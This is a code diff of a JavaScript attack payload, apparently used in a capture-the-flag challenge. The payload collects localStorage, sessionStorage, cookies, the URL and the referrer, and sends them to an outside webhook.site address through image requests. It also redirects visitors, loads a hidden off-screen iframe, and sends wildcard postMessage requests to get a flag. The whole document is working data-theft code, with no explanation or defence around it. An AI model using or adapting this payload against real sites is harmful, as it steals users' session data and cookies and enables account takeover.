@@ -1,7 +1,7 @@
-     console.log('🎯 CROSS-ORIGIN PAYLOAD LOADED');
+     console.log('🎯 UNIFIED PAYLOAD LOADED - Multi-Strategy Flag Extraction');
 
-     // Send immediate confirmation
-     function sendViaImage(data) {
+     // Send immediate confirmation with strategy detection
+     function sendWebhook(data) {
          try {
              const img = new Image();
              const params = new URLSearchParams();
@@ -10,201 +10,245 @@
      JSON.stringify(data[key]) : data[key]);
              });
              img.src =
-     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/cross?' +
+     'https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad/unified?' +
      params.toString();
              document.body.appendChild(img);
-             console.log('Data sent via image');
-         } catch(e) { console.error('Image method failed:', e); }
+             console.log('Webhook sent:', data.status);
+         } catch(e) { console.error('Webhook failed:', e); }
      }
 
-     sendViaImage({
-         status: 'CROSS_ORIGIN_PAYLOAD_START',
+     sendWebhook({
+         status: 'UNIFIED_PAYLOAD_START',
          timestamp: new Date().toISOString(),
          current_domain: window.location.hostname,
          current_url: window.location.href,
-         user_agent: navigator.userAgent
+         user_agent: navigator.userAgent,
+         referrer: document.referrer || 'none'
      });
 
-     // Try multiple approaches to get the flag
-     try {
-         console.log('Searching for flag across all possible locations...');
+     // Strategy 1: If we're on CTF domain, extract flag directly
+     if (window.location.hostname.includes('secjhu') ||
+     window.location.hostname.includes('ctf')) {
+         console.log('🎯 ON CTF DOMAIN - Direct flag extraction');
 
-         // Method 1: Check current domain localStorage
-         const currentStorage = {};
-         const currentKeys = [];
-         for (let i = 0; i < localStorage.length; i++) {
-             const key = localStorage.key(i);
-             const value = localStorage.getItem(key);
-             currentStorage[key] = value;
-             currentKeys.push(key);
-         }
-
-         // Method 2: Check sessionStorage
-         const sessionData = {};
-         const sessionKeys = [];
-         for (let i = 0; i < sessionStorage.length; i++) {
-             const key = sessionStorage.key(i);
-             const value = sessionStorage.getItem(key);
-             sessionData[key] = value;
-             sessionKeys.push(key);
-         }
-
-         // Method 3: Check cookies
-         const cookies = document.cookie;
-
-         // Method 4: Check global variables for flag
-         const globalFlag = window.flag || window.FLAG || window.ctfFlag;
-
-         // Method 5: Try to access parent/opener window if exists
-         let parentData = null;
-         let openerData = null;
-
-         try {
-             if (window.parent && window.parent !== window) {
-                 parentData = {
-                     href: window.parent.location.href,
-                     hostname: window.parent.location.hostname,
-                     localStorage_length: window.parent.localStorage.length
-                 };
-             }
-         } catch(e) { console.log('Parent access blocked:', e.message); }
-
-         try {
-             if (window.opener) {
-                 openerData = {
-                     href: window.opener.location.href,
-                     hostname: window.opener.location.hostname,
-                     localStorage_length: window.opener.localStorage.length
-                 };
-             }
-         } catch(e) { console.log('Opener access blocked:', e.message); }
-
-         // Method 6: Try to create iframe to CTF domain and access its 
-     localStorage
-         function tryIframeAccess() {
-             const iframe = document.createElement('iframe');
-             iframe.style.display = 'none';
-             iframe.src = 'about:blank'; // Start with blank to avoid CORS 
-     initially
-
-             iframe.onload = function() {
-                 try {
-                     // Try to access iframe's localStorage
-                     const iframeStorage = iframe.contentWindow.localStorage;
-                     console.log('Iframe localStorage accessible');
-
-                     // Send iframe data
-                     sendViaImage({
-                         status: 'IFRAME_ACCESS_SUCCESS',
-                         iframe_storage_length: iframeStorage.length,
-                         timestamp: new Date().toISOString()
-                     });
-
-                 } catch(e) {
-                     console.log('Iframe access failed:', e.message);
-                 }
-
-                 // Clean up
-                 setTimeout(() => {
-                     if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
-                 }, 2000);
-             };
-
-             document.body.appendChild(iframe);
-         }
-
-         // Execute iframe attempt
-         setTimeout(tryIframeAccess, 1000);
-
-         // Comprehensive data package
-         const comprehensiveData = {
-             status: 'COMPREHENSIVE_FLAG_SEARCH',
+         sendWebhook({
+             status: 'ON_CTF_DOMAIN_DIRECT_EXTRACTION',
              timestamp: new Date().toISOString(),
+             domain: window.location.hostname
+         });
 
-             // Current domain data
-             current_domain: window.location.hostname,
-             current_url: window.location.href,
-             current_localStorage: JSON.stringify(currentStorage),
-             current_localStorage_keys: currentKeys.join(','),
-             current_localStorage_length: currentKeys.length,
+         try {
+             // Extract flag from localStorage
+             const flag = localStorage.getItem('flag');
+             const allStorage = {};
+             for (let i = 0; i < localStorage.length; i++) {
+                 const key = localStorage.key(i);
+                 allStorage[key] = localStorage.getItem(key);
+             }
 
-             // Session data
-             sessionStorage_data: JSON.stringify(sessionData),
-             sessionStorage_keys: sessionKeys.join(','),
-             sessionStorage_length: sessionKeys.length,
+             sendWebhook({
+                 status: 'CTF_DOMAIN_FLAG_EXTRACTION_COMPLETE',
+                 timestamp: new Date().toISOString(),
+                 success: !!flag,
+                 flag: flag || 'not_found',
+                 all_localStorage: JSON.stringify(allStorage),
+                 localStorage_length: localStorage.length,
+                 domain: window.location.hostname
+             });
 
-             // Cookie data
-             document_cookie: cookies || 'none',
+             if (flag) {
+                 console.log('🚩 FLAG CAPTURED ON CTF DOMAIN:', flag);
 
-             // Global variables
-             global_flag: globalFlag || 'not_found',
+                 // Send flag confirmation multiple times with different methods
+                 sendWebhook({
+                     status: 'FLAG_CONFIRMED_CTF_DOMAIN',
+                     flag: flag,
+                     timestamp: new Date().toISOString(),
+                     extraction_location: 'ctf_domain_localStorage'
+                 });
+             }
 
-             // Window relationships
-             has_parent: window.parent !== window,
-             has_opener: !!window.opener,
-             parent_data: parentData ? JSON.stringify(parentData) : 'none',
-             opener_data: openerData ? JSON.stringify(openerData) : 'none',
+         } catch(e) {
+             sendWebhook({
+                 status: 'CTF_DOMAIN_EXTRACTION_ERROR',
+                 error: e.message,
+                 timestamp: new Date().toISOString()
+             });
+         }
 
-             // Environment info
-             user_agent: navigator.userAgent,
-             referrer: document.referrer || 'none',
-             origin: window.location.origin,
+     } else {
+         // Strategy 2: We're on GitHub Pages - attempt redirect to CTF domain
+         console.log('📄 ON GITHUB PAGES - Attempting redirect strategy');
 
-             // Try direct flag access
-             localStorage_flag: localStorage.getItem('flag') || 'not_found',
-             sessionStorage_flag: sessionStorage.getItem('flag') || 'not_found',
+         sendWebhook({
+             status: 'GITHUB_PAGES_REDIRECT_STRATEGY',
+             timestamp: new Date().toISOString(),
+             current_domain: window.location.hostname
+         });
 
-             // Check for common flag patterns in DOM
-             dom_text_contains_flag: document.body.textContent.includes('flag{') ||
-      document.body.textContent.includes('FLAG{'),
+         // First, try to extract what we can from current domain
+         try {
+             const currentStorage = {};
+             for (let i = 0; i < localStorage.length; i++) {
+                 const key = localStorage.key(i);
+                 currentStorage[key] = localStorage.getItem(key);
+             }
 
-             // Page title and meta
-             page_title: document.title,
-             page_meta: document.head.innerHTML.includes('flag') ||
-     document.head.innerHTML.includes('FLAG')
-         };
+             sendWebhook({
+                 status: 'GITHUB_PAGES_LOCAL_DATA',
+                 timestamp: new Date().toISOString(),
+                 localStorage_data: JSON.stringify(currentStorage),
+                 localStorage_length: localStorage.length,
+                 cookies: document.cookie || 'none',
+                 sessionStorage_length: sessionStorage.length
+             });
 
-         console.log('Sending comprehensive flag search data...');
-         sendViaImage(comprehensiveData);
+         } catch(e) {}
 
-         // Try postMessage to communicate with other windows
+         // Attempt redirect to CTF domain
+         setTimeout(() => {
+             const ctfDomain = 'ctf.secjhu.club'; // Update this if you know the 
+     exact CTF domain
+             const redirectUrl = `https://${ctfDomain}/#messages`;
+
+             sendWebhook({
+                 status: 'ATTEMPTING_REDIRECT_TO_CTF',
+                 timestamp: new Date().toISOString(),
+                 target_url: redirectUrl,
+                 target_domain: ctfDomain
+             });
+
+             console.log('🔄 Redirecting to CTF domain:', redirectUrl);
+
+             // Set a flag to prevent infinite redirects
+             if (!sessionStorage.getItem('redirect_attempted')) {
+                 sessionStorage.setItem('redirect_attempted', 'true');
+                 window.location.href = redirectUrl;
+             } else {
+                 sendWebhook({
+                     status: 'REDIRECT_LOOP_PREVENTED',
+                     timestamp: new Date().toISOString(),
+                     message: 'Redirect already attempted'
+                 });
+             }
+
+         }, 3000);
+     }
+
+     // Strategy 3: Try cross-frame communication
+     try {
          if (window.parent !== window) {
-             try {
-                 window.parent.postMessage({
-                     type: 'FLAG_REQUEST',
-                     timestamp: new Date().toISOString()
-                 }, '*');
-             } catch(e) {}
+             window.parent.postMessage({
+                 type: 'FLAG_REQUEST',
+                 timestamp: new Date().toISOString(),
+                 origin: window.location.origin
+             }, '*');
+
+             sendWebhook({
+                 status: 'POSTMESSAGE_SENT_TO_PARENT',
+                 timestamp: new Date().toISOString()
+             });
          }
 
          if (window.opener) {
-             try {
-                 window.opener.postMessage({
-                     type: 'FLAG_REQUEST',
-                     timestamp: new Date().toISOString()
-                 }, '*');
-             } catch(e) {}
-         }
-
-         // Listen for postMessage responses
-         window.addEventListener('message', function(event) {
-             sendViaImage({
-                 status: 'POSTMESSAGE_RECEIVED',
+             window.opener.postMessage({
+                 type: 'FLAG_REQUEST',
                  timestamp: new Date().toISOString(),
-                 message_origin: event.origin,
-                 message_data: JSON.stringify(event.data)
+                 origin: window.location.origin
+             }, '*');
+
+             sendWebhook({
+                 status: 'POSTMESSAGE_SENT_TO_OPENER',
+                 timestamp: new Date().toISOString()
              });
+         }
+     } catch(e) {}
+
+     // Listen for postMessage responses
+     window.addEventListener('message', function(event) {
+         sendWebhook({
+             status: 'POSTMESSAGE_RECEIVED',
+             timestamp: new Date().toISOString(),
+             message_origin: event.origin,
+             message_data: JSON.stringify(event.data)
          });
 
-     } catch (error) {
-         console.error('Cross-origin payload error:', error);
+         if (event.data && event.data.flag) {
+             sendWebhook({
+                 status: 'FLAG_RECEIVED_VIA_POSTMESSAGE',
+                 timestamp: new Date().toISOString(),
+                 flag: event.data.flag,
+                 source_origin: event.origin
+             });
+         }
+     });
 
-         sendViaImage({
-             status: 'CROSS_ORIGIN_PAYLOAD_ERROR',
-             error_message: error.message,
-             error_stack: error.stack || 'no_stack',
-             timestamp: new Date().toISOString()
-         });
+     // Strategy 4: Try to create iframe to CTF domain (if not already on CTF 
+     domain)
+     if (!window.location.hostname.includes('secjhu') &&
+     !window.location.hostname.includes('ctf')) {
+         setTimeout(() => {
+             try {
+                 const iframe = document.createElement('iframe');
+                 iframe.style.cssText =
+     'position:fixed;left:-9999px;width:1px;height:1px;opacity:0;';
+                 iframe.src = 'https://ctf.secjhu.club/#messages';
+
+                 iframe.onload = function() {
+                     sendWebhook({
+                         status: 'IFRAME_LOADED',
+                         timestamp: new Date().toISOString(),
+                         iframe_src: iframe.src
+                     });
+
+                     // Try to access iframe localStorage (will likely fail due to 
+     CORS)
+                     try {
+                         const iframeStorage = iframe.contentWindow.localStorage;
+                         const iframeFlag = iframeStorage.getItem('flag');
+
+                         if (iframeFlag) {
+                             sendWebhook({
+                                 status: 'FLAG_EXTRACTED_FROM_IFRAME',
+                                 timestamp: new Date().toISOString(),
+                                 flag: iframeFlag
+                             });
+                         }
+                     } catch(e) {
+                         sendWebhook({
+                             status: 'IFRAME_ACCESS_BLOCKED',
+                             timestamp: new Date().toISOString(),
+                             error: e.message
+                         });
+                     }
+                 };
+
+                 document.body.appendChild(iframe);
+
+                 sendWebhook({
+                     status: 'IFRAME_CREATED',
+                     timestamp: new Date().toISOString(),
+                     target: 'https://ctf.secjhu.club/#messages'
+                 });
+
+             } catch(e) {
+                 sendWebhook({
+                     status: 'IFRAME_CREATION_FAILED',
+                     timestamp: new Date().toISOString(),
+                     error: e.message
+                 });
+             }
+         }, 5000);
      }
 
-     console.log('🏁 Cross-origin payload completed');
+     // Send final status
+     setTimeout(() => {
+         sendWebhook({
+             status: 'UNIFIED_PAYLOAD_COMPLETE',
+             timestamp: new Date().toISOString(),
+             domain: window.location.hostname,
+             strategies_attempted: 4
+         });
+     }, 10000);
+
+     console.log('🏁 Unified payload execution completed');
